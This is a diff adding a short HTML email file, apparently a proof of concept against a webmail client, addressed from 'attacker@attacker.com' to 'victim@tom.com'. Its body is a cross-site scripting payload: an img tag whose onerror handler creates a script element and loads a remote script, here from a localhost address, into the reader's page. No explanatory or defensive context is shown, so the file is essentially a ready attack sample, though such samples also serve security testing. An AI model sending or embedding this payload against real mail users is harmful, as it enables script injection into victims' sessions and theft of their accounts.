@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: welcometome
+To: victim@tom.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<img src=xx:x onerror=d=document;e=d.createElement('script');e.src='http://127.0.0.1/i.js';d.body.appendChild(e);>
